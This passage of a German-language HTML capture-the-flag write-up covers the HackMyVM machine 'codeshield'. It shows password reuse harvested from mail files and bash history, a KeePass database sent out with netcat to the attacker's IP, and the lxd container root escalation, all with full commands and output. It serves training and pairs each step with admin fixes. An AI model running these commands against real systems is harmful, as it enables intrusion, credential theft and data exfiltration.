+drwxr-x---    2 2000     2000         4096 Aug 26 09:36 vmail
+226 Directory send OK.
+ftp> <span class="command">quit</span>
+221 Goodbye.
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Erfolgreicher FTP-Login als `valdezk`. Das Home-Verzeichnis wird aufgelistet, `.bash_history` heruntergeladen (ist aber leer) und das `/home`-Verzeichnis wird aufgelistet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der FTP-Zugang gewährt Einblick in das Home-Verzeichnis von `valdezk` und listet andere Benutzer-Home-Verzeichnisse auf (`carlsonj`, `coccia`, `cowrie`, `earlyp`, `iredadmin`, `iredapd`, `mansourm`, `mitchellt`, `netdata`, `tanx`, `vmail`). Dies liefert eine umfassende Liste potenzieller Benutzer.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `valdezk`-Zugangsdaten für den SSH-Login auf Port 22222.
+            <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Informationen, die über FTP zugänglich sind. Verhindern Sie das Auflisten von Verzeichnissen, auf die der Benutzer keinen Zugriff hat.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">ssh valdezk@192.168.2.132 -p22222</span></div> <!-- IP korrigiert -->
+                     <pre>
+The authenticity of host '[192.168.2.132]:22222 ([192.168.2.132]:22222)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.2.132]:22222' (ED25519) to the list of known hosts.
+[...] <!-- Banner -->
+valdezk@192.168.2.132's password: <span class="password">Greatplace2work!</span>
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)
+[...]
+valdezk@codeshield:~$
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH auf Port 22222 (neuere OpenSSH-Version) als `valdezk` mit dem via FTP-Brute-Force gefundenen Passwort anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Initial Access erfolgreich!** Der Login funktioniert, und wir erhalten eine Shell als Benutzer `valdezk` auf dem System `codeshield`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie die lokale Enumeration als `valdezk`. Suchen Sie nach Passwörtern, `sudo`-Rechten, SUID-Dateien, etc.
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort für `valdezk`. Überprüfen Sie die Notwendigkeit von Port 22222 (zusätzlich zu 22?).</p>
+        </section>
+
+        <section id="privilege-escalation-user">
+            <h2>Privilege Escalation (valdezk zu mitchellt zu earlyp)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">valdezk@codeshield:~$ <span class="command">grep -ri passwo 2>/dev/null | tr "," "\n" | grep -i password -w</span></div>
+                     <pre>
+.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv/Trash:Password: <span class="password">D@taWh1sperer!</span>
+.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv/INBOX:Password: <span class="password">D@taWh1sperer!</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `valdezk` wird das Home-Verzeichnis rekursiv nach dem Wort "passwo" durchsucht (`grep -ri`). Die Ausgabe wird etwas aufbereitet (`tr`, `grep`), um Zeilen mit "Password:" zu isolieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> In Thunderbird-Maildateien (Papierkorb und Posteingang) wird ein Passwort gefunden: `<span class="password">D@taWh1sperer!</span>`. Dies gehört wahrscheinlich zu einem E-Mail-Konto, könnte aber auch für andere Systembenutzer wiederverwendet worden sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie dieses Passwort (`<span class="password">D@taWh1sperer!</span>`), um sich als andere gefundene Benutzer (z.B. `mitchellt`, `earlyp`, `carlsonj`) via `su` anzumelden.
+             <br><strong>Empfehlung (Admin):</strong> Schulen Sie Benutzer darin, Passwörter nicht in E-Mails oder lokalen Dateien zu speichern. Implementieren Sie Richtlinien gegen Passwort-Wiederverwendung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Benutzerwechsel-Versuche -->
+                     <div class="prompt">valdezk@codeshield:~$ <span class="command">su vmail</span></div>
+                     <pre>Password: <span class="password">D@taWh1sperer!</span>
+su: Authentication failure</pre>
+                     <div class="prompt">valdezk@codeshield:~$ <span class="command">su tanx</span></div>
+                     <pre>Password: <span class="password">D@taWh1sperer!</span>
+su: Authentication failure</pre>
+                     <div class="prompt">valdezk@codeshield:~$ <span class="command">su mitchellt</span></div>
+                     <pre>Password: <span class="password">D@taWh1sperer!</span>
+mitchellt@codeshield:/home/valdezk$</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das gefundene Passwort `<span class="password">D@taWh1sperer!</span>` wird verwendet, um mittels `su` zu den Benutzern `vmail`, `tanx` und `mitchellt` zu wechseln.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Wechsel zu `vmail` und `tanx` scheitert, aber der Wechsel zu `mitchellt` ist **erfolgreich**. Das Passwort wurde für das `mitchellt`-Konto wiederverwendet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Enumeration als `mitchellt` durch (insbesondere `sudo -l`, Home-Verzeichnis).
+             <br><strong>Empfehlung (Admin):</strong> Passwort-Wiederverwendung ist ein großes Risiko. Setzen Sie technische Kontrollen (falls möglich) und Schulungen ein.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Enumeration als mitchellt -->
+                      <div class="prompt">mitchellt@codeshield:/home/valdezk$ <span class="command">sudo -l</span></div>
+                      <pre>[sudo] password for mitchellt: <span class="password">D@taWh1sperer!</span>
+Sorry, user mitchellt may not run sudo on mail. <!-- Hostname hier 'mail', nicht 'codeshield'? -->
+                      </pre>
+                      <div class="prompt">mitchellt@codeshield:/home/valdezk$ <span class="command">cd ~</span></div>
+                      <div class="prompt">mitchellt@codeshield:~$ <span class="command">ls</span></div>
+                      <pre>Desktop  Documents  Downloads  mining  Music  Pictures  Public  snap  Templates  user.txt  Videos</pre>
+                      <div class="prompt">mitchellt@codeshield:~$ <span class="command">cat user.txt</span></div>
+                      <pre>
+             @@@
+[...] <!-- ASCII Art Banner -->
+  _______________________________________________________________________________________________________
+ |  _USER FLAG!________________________________________________________________________________________  |
+ | |                                                                                                   | |
+ | | <span class="password">Your_password_is_the_key_to_your_digital_life</span>                                                     | |
+ | |                                                                                                   | |
+ | |___________________________________________________________________________________________________| |
+ |_______________________________________________________________________________________________________|
+                      </pre>
+                       <div class="prompt">mitchellt@codeshield:~$ <span class="command">cat .bash_history</span></div>
+                      <pre>
+echo '<span class="password">EARL!YP7DeVel@OP</span>'| su - earlyp -c "cp -r /home/earlyp/Development/mining ."
+echo '<span class="password">EARL!YP7DeVel@OP</span>'| su - earlyp -c "cp -r /home/earlyp/Development/mining /tmp"
+cp -r /tmp/mining .
+ls
+cd mining/
+ls
+exit
+                      </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `mitchellt` werden `sudo`-Rechte geprüft, das Home-Verzeichnis untersucht und die `.bash_history` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong>
+                <ul>
+                    <li>`mitchellt` hat keine `sudo`-Rechte.</li>
+                    <li>Die User-Flagge `<span class="password">Your_password_is_the_key_to_your_digital_life</span>` wird in `user.txt` gefunden.</li>
+                    <li>**Wichtiger Fund:** Die `.bash_history` enthält Befehle, die das Passwort für den Benutzer `earlyp` im Klartext zeigen: `<span class="password">EARL!YP7DeVel@OP</span>`.</li>
+                </ul></p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flagge notiert. Verwenden Sie das gefundene Passwort, um zu `earlyp` zu wechseln (`su earlyp`).
+             <br><strong>Empfehlung (Admin):</strong> Schulen Sie Benutzer, Passwörter nicht in Befehlen oder Skripten zu verwenden, die in der History landen. Konfigurieren Sie ggf. die Bash History so, dass bestimmte Befehle ignoriert werden (obwohl dies keine echte Sicherheitslösung ist).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">mitchellt@codeshield:~$ <span class="command">su earlyp</span></div>
+                     <pre>Password: <span class="password">EARL!YP7DeVel@OP</span>
+earlyp@codeshield:/home/mitchellt$
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit dem Passwort aus der Bash History wird zu `earlyp` gewechselt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der Benutzerkontext wurde zu `earlyp` gewechselt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Enumeration als `earlyp` durch (sudo, SUID, Gruppen, Home-Verzeichnis).
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie das kompromittierte Passwort für `earlyp`.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                       <!-- Enumeration als earlyp -->
+                      <div class="prompt">earlyp@codeshield:~$ <span class="command">sudo -l</span></div>
+                      <pre>[sudo] password for earlyp: <span class="password">EARL!YP7DeVel@OP</span>
+Sorry, user earlyp may not run sudo on mail.
+                      </pre>
+                      <div class="prompt">earlyp@codeshield:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                      <pre>[...] <!-- Standard SUID Files --> </pre>
+                      <div class="prompt">earlyp@codeshield:~$ <span class="command">grep -ri pass</span></div>
+                      <pre>
+.cache/keepassxc/keepassxc.ini:LastActiveDatabase=/home/earlyp/Documents/Passwords.kdbx
+.cache/keepassxc/keepassxc.ini:LastDatabases=/home/earlyp/Documents/Passwords.kdbx
+.cache/keepassxc/keepassxc.ini:LastOpenedDatabases=/home/earlyp/Documents/Passwords.kdbx
+                      </pre>
+                       <div class="prompt">earlyp@codeshield:~$ <span class="command">mv /home/earlyp/Documents/Passwords.kdbx .</span></div>
+                       <div class="prompt">earlyp@codeshield:~$ <span class="command">ls -la Passwords.kdbx</span></div>
+                      <pre>-rw-------  1 earlyp earlyp 1918 Aug 28 17:42 Passwords.kdbx</pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Als `earlyp` werden sudo-Rechte und SUID-Dateien geprüft (keine direkten Treffer). Die Suche nach "pass" enthüllt eine KeepassXC-Datenbankdatei (`Passwords.kdbx`) im Dokumentenordner. Diese wird ins aktuelle Verzeichnis verschoben.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> `earlyp` hat keine sudo-Rechte. Der Fund der Keepass-Datenbank (`.kdbx`) ist potenziell sehr wertvoll, da sie weitere Passwörter enthalten könnte. Sie muss jedoch offline geknackt werden.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Übertragen Sie die `Passwords.kdbx`-Datei auf Ihr Angreifersystem (z.B. mit `nc`). Versuchen Sie, das Master-Passwort der Datenbank offline mit Tools wie `john` (keepass2john) oder `hashcat` zu knacken. Verwenden Sie dabei die bereits bekannten Passwörter als Kandidaten. Prüfen Sie parallel die Gruppenzugehörigkeiten von `earlyp` (`id`).
+              <br><strong>Empfehlung (Admin):</strong> Schulen Sie Benutzer darin, Passwort-Datenbanken mit starken Master-Passwörtern zu schützen und die Datenbankdatei sicher aufzubewahren.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Übertragen der KDBX-Datei -->
+                      <div class="prompt">earlyp@codeshield:~$ <span class="command">nc -N 192.168.2.199 22222 < Passwords.kdbx</span></div>
+                      <!-- Auf Angreifer-System -->
+                      <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nc -vl 22222 > Passwords.kdbx</span></div>
+                      <pre>
+Listening on 0.0.0.0 22222
+Connection received on codeshield.hmv 40972
+                      </pre>
+                      <!-- Datei empfangen (Größe prüfen) -->
+                      <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">ll Passwords.kdbx</span></div>
+                      <pre>-rw-r--r--  1 root root 1918 27. Okt 16:52 Passwords.kdbx</pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Die `Passwords.kdbx`-Datei wird mittels `nc` vom Zielsystem zum Angreifersystem übertragen. `-N` auf dem Ziel schließt die Verbindung nach dem Senden, der Listener auf dem Angreifersystem schreibt die empfangenen Daten in eine lokale Datei.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Keepass-Datenbank wurde erfolgreich übertragen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit dem Offline-Cracking der KDBX-Datei. Überprüfen Sie währenddessen andere Vektoren, insbesondere die Gruppenzugehörigkeit von `earlyp`.
+              <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Netzwerkverbindungen und Datentransfers.</p>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Privilege Escalation Path earlyp zu root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Während die Keepass-Datenbank möglicherweise im Hintergrund geknackt wird, wird die Gruppenzugehörigkeit des Benutzers `earlyp` überprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl `id` (ausgeführt als `earlyp`) zeigt, dass `earlyp` Mitglied der Gruppe `lxd` ist (`groups=...,110(lxd)`). Dies ist ein bekannter und oft einfacher Weg zur Privilege Escalation unter Linux. Mitglieder der `lxd`-Gruppe können LXD-Container erstellen und verwalten. Durch das Erstellen eines privilegierten Containers und das Mounten des Host-Dateisystems in diesen Container kann Root-Zugriff auf den Host erlangt werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Mitgliedschaft in der `lxd`-Gruppe zur Eskalation:
+                1.  Laden Sie ein minimales LXD-Image auf das Ziel (falls noch nicht vorhanden) oder verwenden Sie ein vorhandenes (`lxc image list`).
+                2.  Initialisieren Sie einen privilegierten Container (`lxc init ... security.privileged=true`).
+                3.  Mounten Sie das Root-Verzeichnis des Hosts in den Container (`lxc config device add ...`).
+                4.  Starten Sie den Container (`lxc start ...`).
+                5.  Führen Sie eine Shell im Container aus (`lxc exec ... bash`).
+                6.  Greifen Sie auf das gemountete Host-Verzeichnis zu (`/mnt/root`) und lesen Sie `/mnt/root/root/root.txt`.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Beschränken Sie die Mitgliedschaft in der `lxd`-Gruppe nur auf absolut vertrauenswürdige Administratoren, die diese Rechte benötigen. Behandeln Sie die `lxd`-Gruppe quasi wie Root-Zugriff. Entfernen Sie `earlyp` (und andere unprivilegierte Benutzer) aus dieser Gruppe.</p>
+         </section>
+
+         <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (earlyp zu root)</h2>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">earlyp@codeshield:~$ <span class="command">id</span></div>
+                      <pre>uid=1000(earlyp) gid=1000(earlyp) groups=1000(earlyp),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)</pre>
+                      <!-- LXD Exploitation Steps -->
+                       <div class="prompt">earlyp@codeshield:/dev/shm$ <span class="command">lxc image list</span></div>
+                      <pre>
++-------+--------------+--------+---------------------------------------------+--------------+-----------+----------+------------------------------+
+| ALIAS | FINGERPRINT  | PUBLIC |                 DESCRIPTION                 | ARCHITECTURE |   TYPE    |   SIZE   |         UPLOAD DATE          |
++-------+--------------+--------+---------------------------------------------+--------------+-----------+----------+------------------------------+
+|       | <span class="password">712a58368655</span> | no     | ubuntu 16.04 LTS amd64 (release) (20211001) | x86_64       | CONTAINER | 171.55MB | Oct 27, 2023 at 3:04pm (UTC) |
++-------+--------------+--------+---------------------------------------------+--------------+-----------+----------+------------------------------+
+                      </pre>
+                       <div class="prompt">earlyp@codeshield:/dev/shm$ <span class="command">lxc init 712a58368655 test -c security.privileged=true</span></div> <!-- Fingerprint aus Liste verwendet -->
+                      <pre>Creating test</pre>
+                       <div class="prompt">earlyp@codeshield:/dev/shm$ <span class="command">lxc config device add test whatever disk source=/ path=/mnt/root recursive=true</span></div>
+                      <pre>Device whatever added to test</pre>
+                       <div class="prompt">earlyp@codeshield:/dev/shm$ <span class="command">lxc start test</span></div>
+                      <!-- Kein Output -->
+                       <div class="prompt">earlyp@codeshield:/dev/shm$ <span class="command">lxc exec test bash</span></div>
+                      <pre>root@test:/#</pre> <!-- Prompt ändert sich zur Container-Root-Shell -->
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Benutzer `earlyp` bestätigt seine Mitgliedschaft in der Gruppe `lxd`. Anschließend wird die Standard-LXD-Privilege-Escalation-Technik angewendet:
+                1.  Ein verfügbares LXD-Image wird aufgelistet (Fingerprint `712a58368655`).
+                2.  Ein privilegierter Container namens `test` wird aus diesem Image initialisiert.
+                3.  Das Root-Dateisystem (`/`) des Host-Systems wird als Gerät `whatever` in den Container unter `/mnt/root` gemountet.
+                4.  Der Container wird gestartet.
+                5.  Eine Bash-Shell wird innerhalb des Containers ausgeführt (`lxc exec`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Alle Schritte funktionieren wie erwartet. Der Angreifer hat nun eine Root-Shell (`root@test`) innerhalb des Containers, und das gesamte Dateisystem des Hosts ist unter `/mnt/root` zugänglich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Navigieren Sie innerhalb der Container-Shell zu `/mnt/root/root/` und lesen Sie die Root-Flagge `root.txt`.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie unprivilegierte Benutzer aus der `lxd`-Gruppe.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Innerhalb der Container-Root-Shell -->
+                      <div class="prompt">root@test:/# <span class="command">cd /mnt/root/root/</span></div>
+                      <div class="prompt">root@test:/mnt/root/root# <span class="command">ls</span></div>
+                      <pre>cowrie  root.txt  snap</pre>
+                      <div class="prompt">root@test:/mnt/root/root# <span class="command">cat root.txt</span></div>
+                      <pre>
+             @@@
+[...] <!-- ASCII Art Banner -->
+  _______________________________________________________________________________________________________
+ |  _ROOT FLAG!________________________________________________________________________________________  |
+ | |                                                                                                   | |
+ | | <span class="password">Educate_your_employees_on_password_safety</span>                                                         | |
+ | |                                                                                                   | |
+ | |___________________________________________________________________________________________________| |
+ |_______________________________________________________________________________________________________|
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Innerhalb der Container-Shell wird zum gemounteten `/root`-Verzeichnis des Hosts navigiert und die Datei `root.txt` ausgelesen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flagge `<span class="password">Educate_your_employees_on_password_safety</span>` wurde erfolgreich gefunden.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Maschine abgeschlossen.
+              <br><strong>Empfehlung (Admin):</strong> Beheben Sie die identifizierten Schwachstellen (Anon FTP, alte SSH-Versionen, Passwort-Wiederverwendung, Passwörter in Dateien/History, LXD-Gruppenmitgliedschaft).</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der User-Flagge (als mitchellt) -->
+                     <div class="flag-command">cat /home/mitchellt/user.txt</div>
+                     <!-- User-Flagge -->
+                     <div class="flag-value"><span class="password">Your_password_is_the_key_to_your_digital_life</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der Root-Flagge (als root via LXD Container) -->
+                     <div class="flag-command">cat /mnt/root/root/root.txt</div> <!-- Pfad innerhalb des Containers -->
+                     <!-- Root-Flagge -->
+                     <div class="flag-value"><span class="password">Educate_your_employees_on_password_safety</span></div>
+                 </div>
+             </div>
+             <!-- Keine Analyse/Bewertung/Empfehlung im Flags-Abschnitt -->
+         </section>
+  
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/Nikto Scan übernommen -->
+        <p>Berichtsdatum: 2023-09-27</p>
+    </footer>
+</body>
+</html>
